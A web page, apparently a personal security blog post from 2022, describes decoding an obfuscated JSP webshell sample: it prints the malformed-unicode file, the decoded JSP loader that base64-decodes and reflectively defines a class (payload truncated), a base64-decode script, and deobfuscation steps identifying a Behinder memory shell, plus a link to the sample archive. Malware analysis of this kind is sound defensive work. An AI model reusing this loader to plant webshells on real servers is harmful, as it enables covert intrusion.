@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+    
+    <title>畸形jsp木马解码小记 | RainMaker</title>
+
+    <meta name="description" content="&lt;h2 id=&#34;Jsp木马&#34;&gt;&lt;a href=&#34;#Jsp木马&#34; class=&#34;headerlink&#34; title=&#34;Jsp木马&#34;&gt;&lt;/a&gt;Jsp木马&lt;/h2&gt;&lt;p&gt;偶然获取一个jsp木马样本，其内容为畸形unicode编码，通过替换\uuu和\uu 统一替换成 \u 再进行Unicode解码。 &lt;a href=&#34;https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/demo.zip&#34;&gt;demo.zip&lt;/a&gt; &lt;/p&gt;">
+    <meta name="keywords" content="">
+
+    
+
+    <meta property="og:locale" content="cn" />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content= "畸形jsp木马解码小记 | RainMaker"  />
+    <meta property="og:description" content= "&lt;h2 id=&#34;Jsp木马&#34;&gt;&lt;a href=&#34;#Jsp木马&#34; class=&#34;headerlink&#34; title=&#34;Jsp木马&#34;&gt;&lt;/a&gt;Jsp木马&lt;/h2&gt;&lt;p&gt;偶然获取一个jsp木马样本，其内容为畸形unicode编码，通过替换\uuu和\uu 统一替换成 \u 再进行Unicode解码。 &lt;a href=&#34;https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/demo.zip&#34;&gt;demo.zip&lt;/a&gt; &lt;/p&gt;" />
+    <meta property="og:url" content="http://hasaki-h2.github.io/4c0f1c5d.html" />
+    <meta property="og:site_name" content="" />
+    <meta property="article:author" content="" />
+    <meta property="article:publisher" content="" />
+    <meta property="og:description" content="&lt;h2 id=&#34;Jsp木马&#34;&gt;&lt;a href=&#34;#Jsp木马&#34; class=&#34;headerlink&#34; title=&#34;Jsp木马&#34;&gt;&lt;/a&gt;Jsp木马&lt;/h2&gt;&lt;p&gt;偶然获取一个jsp木马样本，其内容为畸形unicode编码，通过替换\uuu和\uu 统一替换成 \u 再进行Unicode解码。 &lt;a href=&#34;https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/demo.zip&#34;&gt;demo.zip&lt;/a&gt; &lt;/p&gt;" />
+    <meta name="twitter:title" content="畸形jsp木马解码小记 | RainMaker"/>
+    <meta name="twitter:description" content="&lt;h2 id=&#34;Jsp木马&#34;&gt;&lt;a href=&#34;#Jsp木马&#34; class=&#34;headerlink&#34; title=&#34;Jsp木马&#34;&gt;&lt;/a&gt;Jsp木马&lt;/h2&gt;&lt;p&gt;偶然获取一个jsp木马样本，其内容为畸形unicode编码，通过替换\uuu和\uu 统一替换成 \u 再进行Unicode解码。 &lt;a href=&#34;https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/demo.zip&#34;&gt;demo.zip&lt;/a&gt; &lt;/p&gt;"/>
+    <script type="application/ld+json">
+        {
+            "description": "&lt;h2 id=&#34;Jsp木马&#34;&gt;&lt;a href=&#34;#Jsp木马&#34; class=&#34;headerlink&#34; title=&#34;Jsp木马&#34;&gt;&lt;/a&gt;Jsp木马&lt;/h2&gt;&lt;p&gt;偶然获取一个jsp木马样本，其内容为畸形unicode编码，通过替换\uuu和\uu 统一替换成 \u 再进行Unicode解码。 &lt;a href=&#34;https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/demo.zip&#34;&gt;demo.zip&lt;/a&gt; &lt;/p&gt;",
+            "author": { "@type": "Person", "name": "" },
+            "@type": "BlogPosting",
+            "url": "http://hasaki-h2.github.io/4c0f1c5d.html",
+            "publisher": {
+            "@type": "Organization",
+            "logo": {
+                "@type": "ImageObject",
+                "url": "http://Hasaki-h2.github.io/images/avatar.jpg"
+            },
+            "name": ""
+            },
+            "headline": "畸形jsp木马解码小记 | RainMaker",
+            "datePublished": "2022-06-23T16:06:01.000Z",
+            "mainEntityOfPage": {
+                "@type": "WebPage",
+                "@id": "http://hasaki-h2.github.io/4c0f1c5d.html"
+            },
+            "@context": "http://schema.org"
+        }
+    </script>
+
+
+
+
+    
+
+    
+    <meta property="algolia:search" data-application-id="T8IRMXQO87" data-api-key="614acade121cd1054c73da7b48c66120" data-index-name="test">
+    
+
+    
+
+    
+
+    
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🎮</text></svg>">
+    
+
+    
+
+    
+
+    
+<link rel="stylesheet" href="/dist/build.css?v=1654266144177.css">
+
+
+    
+<link rel="stylesheet" href="/dist/custom.css?v=1654266144177.css">
+
+
+    <script>
+        window.isPost = true
+        window.aomori = {
+            
+            
+            valine: {
+                enable: true,
+                appId: "xClBvTvhGrfI2roMnMSLmHUm-gzGzoHsz",
+                appKey: "Qi9SH982uKy3x14sNYdKegyJ",
+                placeholder: "Hello World!",
+                avatar: "",
+                pageSize: "10",
+                lang: "zh-CN",
+                visitor: false,
+                highlight: false,
+                recordIP: false,
+                emojiCDN: "",
+                enableQQ: false,
+                requiredFields: []
+            },
+            
+            
+        }
+        window.aomori_logo_typed_animated = true
+        window.aomori_search_algolia = true
+
+    </script>
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+
+    <div class="container">
+    <header class="header">
+        <div class="header-type">
+            
+            <div class="header-type-avatar avatar avatar-sm">
+                <img src="/images/avatar.jpg" alt="">
+            </div>
+            
+            <div class="header-type-inner">
+                
+                    <div id="typed-strings" style="display:none">
+                        <p>RainMaker</p>
+                    </div>
+                    <a class="header-type-title" id="typed" href="/"></a>
+                
+    
+                
+            </div>
+        </div>
+        <div class="header-menu">
+            <div class="header-menu-inner">
+                
+                <a href="/">Home</a>
+                
+                <a href="/archives">Archives</a>
+                
+                <a href="/friends">Friends</a>
+                
+            </div>
+            <div class="header-menu-social">
+                
+    <a class="social" target="_blank" href="">
+        <ion-icon name=""></ion-icon>
+    </a>
+
+    <a class="social" target="_blank" href="">
+        <ion-icon name=""></ion-icon>
+    </a>
+
+            </div>
+        </div>
+
+        <div class="header-menu-mobile">
+            <div class="header-menu-mobile-inner" id="mobile-menu-open">
+                <i class="icon icon-menu"></i>
+            </div>
+        </div>
+    </header>
+
+    <div class="header-menu-mobile-menu">
+        <div class="header-menu-mobile-menu-bg"></div>
+        <div class="header-menu-mobile-menu-wrap">
+            <div class="header-menu-mobile-menu-inner">
+                <div class="header-menu-mobile-menu-close" id="mobile-menu-close">
+                    <i class="icon icon-cross"></i>
+                </div>
+                <div class="header-menu-mobile-menu-list">
+                    
+                    <a href="/">Home</a>
+                    
+                    <a href="/archives">Archives</a>
+                    
+                    <a href="/friends">Friends</a>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+
+</div>
+
+    <div class="container">
+        <div class="main">
+            <section class="inner">
+                <section class="inner-main">
+                    <div class="post">
+    <article id="post-cl4rl0y790000u15yh7xd1qw2" class="article article-type-post" itemscope
+    itemprop="blogPost">
+
+    <div class="article-inner">
+
+        
+          
+        
+        
+        
+
+        
+        <header class="article-header">
+            
+  
+    <h1 class="article-title" itemprop="name">
+      畸形jsp木马解码小记
+    </h1>
+  
+
+        </header>
+        
+
+        <div class="article-more-info article-more-info-post hairline">
+
+            <div class="article-date">
+  <time datetime="2022-06-23T16:06:01.000Z" itemprop="datePublished">2022-06-24</time>
+</div>
+
+            
+            <div class="article-category">
+                <a class="article-category-link" href="/categories/Web%E6%B8%97%E9%80%8F/">Web渗透</a>,<a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+            </div>
+            
+
+            
+            <div class="article-tag">
+                <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WebShell/" rel="tag">WebShell</a></li></ul>
+            </div>
+            
+
+            
+            <div class="article-busuanzi">
+                <span id="busuanzi_value_page_pv">N</span> 人看过
+            </div>
+            
+
+        </div>
+
+        <div class="article-entry post-inner-html hairline" itemprop="articleBody">
+            <h2 id="Jsp木马"><a href="#Jsp木马" class="headerlink" title="Jsp木马"></a>Jsp木马</h2><p>偶然获取一个jsp木马样本，其内容为畸形unicode编码，通过替换\uuu和\uu 统一替换成 \u 再进行Unicode解码。 <a target="_blank" rel="noopener" href="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/demo.zip">demo.zip</a> </p>
+<span id="more"></span>
+
+<pre><code class="hljs bash">&lt;%\uuu0074\uuu0072\uu0079\u0020\u007b\uu000a\uuu0020   \uu0043l\uuu0061s\u0073\uu004co\uu0061de\u0072\uuu0020cl\uuu007aLo\uu0061d\u0065\uu0072\u0020\uuu003d T\uu0068\u0072e\uu0061\u0064\uu002ecu\u0072rentT\uuu0068r\uu0065a\uu0064\u0028\uu0029\uu002eg\u0065\uu0074\uuu0043o\uu006ete\u0078\uuu0074\uu0043la\uu0073\uu0073\u004c\u006f\u0061\u0064\u0065r(\uu0029\u003b\uu000a\uuu0020  \u0020St\u0072in\u0067\u0020\uuu0063l\uu007a\uuu004e\u0061m\uu0065\uuu0020=\uuu0020\uuu0022\u0052id\uu0064li\uuu006e\u0067s\u0022;\u000a \uuu0020\u0020 ...................
+..................\uuu0028E\u0078\uu0063\uuu0065pt\uuu0069on\uu0020\uu0065\uuu0029\uu0020&#123;\u007d%&gt;</code></pre>
+
+
+
+<h2 id="解码过程"><a href="#解码过程" class="headerlink" title="解码过程"></a>解码过程</h2><p>使用工具对其进行解码，repo：<a target="_blank" rel="noopener" href="https://github.com/yumusb/dejce">https://github.com/yumusb/dejce</a></p>
+<pre><code class="hljs bash">python3 dejce.py -i redirect.jsp -o webshell.jsp</code></pre>
+
+<p>解码结果如下：</p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220624005906534-20220624032456442.png" alt="image-20220624005906534111"></p>
+<pre><code class="hljs jsp">&lt;%<span class="hljs-keyword">try</span> &#123;
+    ClassLoader clzLoader = Thread.currentThread().getContextClassLoader();
+    String clzName = <span class="hljs-string">&quot;Riddlings&quot;</span>;
+    String clzBytecodeBase64Str = <span class="hljs-string">&quot;yv66vgAAADIBHwcAcAcAdAgAMAcAj.......&quot;</span>;
+    <span class="hljs-keyword">byte</span>[] bytecode = <span class="hljs-keyword">null</span>;
+    <span class="hljs-keyword">try</span> &#123;
+        Class base64Clz = clzLoader.loadClass(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);
+        Class decoderClz = clzLoader.loadClass(<span class="hljs-string">&quot;java.util.Base64$Decoder&quot;</span>);
+        Object decoder = base64Clz.getMethod(<span class="hljs-string">&quot;getDecoder&quot;</span>).invoke(base64Clz);
+        bytecode = (<span class="hljs-keyword">byte</span>[]) decoderClz.getMethod(<span class="hljs-string">&quot;decode&quot;</span>, String.class).invoke(decoder, clzBytecodeBase64Str);
+    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;
+        Class datatypeConverterClz = clzLoader.loadClass(<span class="hljs-string">&quot;javax.xml.bind.DatatypeConverter&quot;</span>);
+        bytecode = (<span class="hljs-keyword">byte</span>[]) datatypeConverterClz.getMethod(<span class="hljs-string">&quot;parseBase64Binary&quot;</span>, String.class).invoke(datatypeConverterClz, clzBytecodeBase64Str);
+    &#125;
+    java.lang.reflect.Method defineClzMethod = clzLoader.loadClass(<span class="hljs-string">&quot;java.lang.ClassLoader&quot;</span>).getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-keyword">byte</span>[].class, <span class="hljs-keyword">int</span>.class, <span class="hljs-keyword">int</span>.class);
+    defineClzMethod.setAccessible(<span class="hljs-keyword">true</span>);
+    Class clz = (Class) defineClzMethod.invoke(clzLoader, clzName, bytecode, <span class="hljs-number">0</span>, bytecode.length);
+    clz.newInstance();
+&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;&#125;%&gt;</code></pre>
+
+<p>大致意思就是使用类加载器加载base编码后的字节码文件：<code>yv66vgAAADIBHwcAcAcAdAgAMAcAj.......</code></p>
+<p>之后使用python脚本进行base64解码，：</p>
+<pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-comment"># encoding: utf-8</span>
+<span class="hljs-keyword">import</span> base64
+
+s=<span class="hljs-string">b&quot;yv66vg..............&quot;</span>
+<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span> (<span class="hljs-string">&quot;444.class&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:
+    f.write(base64.b64decode(s))</code></pre>
+
+<p>压缩<code>444.class</code>为<code>444.zip</code>，并进行反混淆解密，两个版本都需要，运行的话只需要gui版的，同时还需要安装一个工具进行辅助反混淆，repo:</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/java-deobfuscator/deobfuscator/releases/download/1.5.2/deobfuscator.jar">https://github.com/java-deobfuscator/deobfuscator/releases/download/1.5.2/deobfuscator.jar</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/java-deobfuscator/deobfuscator-gui/releases/download/3.3/deobfuscator-gui.jar">https://github.com/java-deobfuscator/deobfuscator-gui/releases/download/3.3/deobfuscator-gui.jar</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.azul.com/downloads/?package=jdk-fx">https://www.azul.com/downloads/?package=jdk-fx</a></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220624051812760.png" alt="image-20220624051812760"></p>
+<p>将生成的445.zip解压，获取文件Riddlings.class，并使用luyten工具打开，工具下载地址：<a target="_blank" rel="noopener" href="https://github.com/deathmarine/Luyten/releases/tag/v0.5.4_Rebuilt_with_Latest_depenencies">https://github.com/deathmarine/Luyten/releases/tag/v0.5.4_Rebuilt_with_Latest_depenencies</a></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220624055257369.png" alt="image-20220624055257369"></p>
+<p>将其中的base64编码复制出来重新使用脚本python脚本解码，解码后保存为<code>qwerr.class</code>，重新按照上述步骤进行反混淆处理，即压缩<code>qwerr.class</code>为<code>qwerr.zip</code>，反混淆之后生成的压缩包解压后目录如下：</p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220624052004640.png" alt="image-20220624052004640"></p>
+<p>使用反混淆工具查看<code>MelebioseFilter.class</code>，即可发现其为冰蝎内存马。</p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220624055916901.png" alt="image-20220624055916901"></p>
+<h2 id="参考link"><a href="#参考link" class="headerlink" title="参考link"></a>参考link</h2><p><a target="_blank" rel="noopener" href="https://www.studysec.com/#/papers/shell/BehinderShell">https://www.studysec.com/#/papers/shell/BehinderShell</a></p>
+
+        </div>
+
+    </div>
+
+    
+
+    
+
+    
+
+    
+  <div class="article-copyright hairline">
+    <p>
+      本作品采用  <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-nd/4.0/">知识共享署名-非商业性使用-禁止演绎 4.0 国际许可协议 (CC BY-NC-ND 4.0)</a> 进行许可。
+    </p>
+  </div>
+  
+
+    
+
+    
+<nav class="article-nav">
+  
+  
+    <a href="/896645eb.html" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-caption">上一篇</div>
+      <div class="article-nav-title">内网学习笔记七 | 跨域攻击分析及防御</div>
+    </a>
+  
+</nav>
+
+
+    <section class="share">
+        <div class="share-title">分享</div>
+        <a class="share-item" target="_blank"
+            href="https://twitter.com/share?text=畸形jsp木马解码小记 - RainMaker&url=http%3A%2F%2Fhasaki-h2.github.io%2F4c0f1c5d.html">
+            <ion-icon name="logo-twitter"></ion-icon>
+        </a>
+        <a class="share-item" target="_blank"
+            href="https://www.facebook.com/sharer.php?title=畸形jsp木马解码小记 - RainMaker&u=http%3A%2F%2Fhasaki-h2.github.io%2F4c0f1c5d.html">
+            <ion-icon name="logo-facebook"></ion-icon>
+        </a>
+        <!-- <a class="share-item" target="_blank"
+            href="https://service.weibo.com/share/share.php?title=畸形jsp木马解码小记 - RainMaker&url=http://hasaki-h2.github.io/4c0f1c5d.html&pic=">
+            <div class="n-icon n-icon-weibo"></div>
+        </a> -->
+    </section>
+
+</article>
+
+
+
+
+
+
+
+
+
+
+<section class="comments">
+    <div id="valine-container"></div>
+</section>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+
+
+
+
+
+
+
+<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+</div>
+                </section>
+            </section>
+
+            
+            <aside class="sidebar sidebar-search-fix">
+                
+
+    <div class="search">
+    <div class="has-icon-right">
+        <input type="text" class="form-input" id="search" placeholder="SEARCH" autocomplete="off">
+        <div class="form-icon">
+            <ion-icon name="search"></ion-icon>
+        </div>
+    </div>
+    <div class="search-result" id="search-ps"></div>
+</div>
+
+
+<div class="widget" id="widget">
+    
+      
+  <div class="widget-wrap">
+    <div class="widget-inner">
+      <div class="toc post-toc-html"></div>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget-wrap widget-cate">
+    <div class="widget-title"><span>Categories</span></div>
+    <div class="widget-inner">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E6%B8%97%E9%80%8F/">Web渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%B6%E4%BB%96/">其他</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/">开发语言</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">横向移动</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6/">溯源反制</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">环境配置</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%84%9A%E6%9C%AC%E5%BC%80%E5%8F%91/">脚本开发</a></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap widget-tags">
+    <div class="widget-title"><span>Tags</span></div>
+    <div class="widget-inner">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ARL/" rel="tag">ARL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Access/" rel="tag">Access</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Bugku/" rel="tag">Bugku</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Burpsuite/" rel="tag">Burpsuite</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cap-Pwd/" rel="tag">Cap_Pwd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CobaltStrike/" rel="tag">CobaltStrike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Empire/" rel="tag">Empire</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GetShell/" rel="tag">GetShell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Goby/" rel="tag">Goby</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Intranet/" rel="tag">Intranet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kali/" rel="tag">Kali</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Lfi/" rel="tag">Lfi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Log4j/" rel="tag">Log4j</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Mysql/" rel="tag">Mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Oracle/" rel="tag">Oracle</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PTE/" rel="tag">PTE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Priviledge/" rel="tag">Priviledge</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Proxy/" rel="tag">Proxy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pth/" rel="tag">Pth</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Sql/" rel="tag">Sql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tools/" rel="tag">Tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/VulLab/" rel="tag">VulLab</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WebShell/" rel="tag">WebShell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Xff/" rel="tag">Xff</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Xray/" rel="tag">Xray</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap widget-recent-posts">
+    <div class="widget-title"><span>Recent Posts</span></div>
+    <div class="widget-inner">
+      <ul>
+        
+          <li>
+            <a href="/4c0f1c5d.html">畸形jsp木马解码小记</a>
+          </li>
+        
+          <li>
+            <a href="/896645eb.html">内网学习笔记七 | 跨域攻击分析及防御</a>
+          </li>
+        
+          <li>
+            <a href="/83b61d10.html">内网学习笔记六 | 域控制器安全</a>
+          </li>
+        
+          <li>
+            <a href="/f9f7ea1f.html">内网学习笔记八 | 权限维持分析及防御</a>
+          </li>
+        
+          <li>
+            <a href="/687f7c3.html">内网学习笔记五 | 域内横向移动分析及防御</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget-wrap widget-archive">
+    <div class="widget-title"><span>Archive</span></div>
+    <div class="widget-inner">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/">2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/">2018</a></li></ul>
+    </div>
+  </div>
+
+
+    
+</div>
+
+<div id="backtop"><i class="icon icon-arrow-up"></i></div>
+            </aside>
+            
+        </div>
+    </div>
+
+    <footer class="footer">
+    <div class="footer-wave">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320"><path fill="#3c4859" fill-opacity="1" d="M0,160L60,181.3C120,203,240,245,360,240C480,235,600,181,720,186.7C840,192,960,256,1080,261.3C1200,267,1320,213,1380,186.7L1440,160L1440,320L1380,320C1320,320,1200,320,1080,320C960,320,840,320,720,320C600,320,480,320,360,320C240,320,120,320,60,320L0,320Z"></path></svg>
+    </div>
+
+    <!-- Please do not remove this -->
+    <!-- 开源不易，请勿删除 -->
+    <div class="footer-wrap">
+        <div class="footer-inner"> 
+            RainMaker &copy; 2022<br>
+            Powered By Hexo · Theme By <a href="https://linhong.me/" target="_blank">Aomori</a> · <a href="https://github.com/lh1me/hexo-theme-aomori" target="_blank">Github</a>
+        </div>
+    </div>
+
+</footer>
+
+<script type="module" src="https://unpkg.com/ionicons@6.0.2/dist/ionicons/ionicons.esm.js"></script>
+
+
+
+
+
+
+<script src="/dist/build.js?1654266144177.js"></script>
+
+
+<script src="/dist/custom.js?1654266144177.js"></script>
+
+
+
+<!-- 百度链接提交 -->
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        }
+        else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+
+
+
+
+
+
+
+
+
+<!-- Baidu Analytics-->
+<script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?df9a1971c34200c9a339305db5b13a60";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+</body>
+
+</html>
